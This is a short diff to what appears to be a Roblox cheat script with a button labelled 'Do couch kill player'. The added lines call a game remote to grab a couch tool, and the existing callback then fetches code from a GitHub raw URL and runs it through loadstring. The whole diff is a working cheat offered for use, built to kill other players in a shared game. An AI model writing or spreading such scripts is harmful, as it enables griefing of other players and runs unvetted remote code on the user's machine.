@@ -66,6 +66,14 @@ local Input = YourTab:CreateInput({
 local Button = Tab:CreateButton({
     Name = "Do couch kill player",
     Callback = function()
+               local args = {
+    [1] = "PickingTools",
+    [2] = "Couch"
+}
+ 
+game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer(unpack(args))
+
+--kill
         -- Executa o loadstring para o script que você especificou
         loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Void'))()
     end,
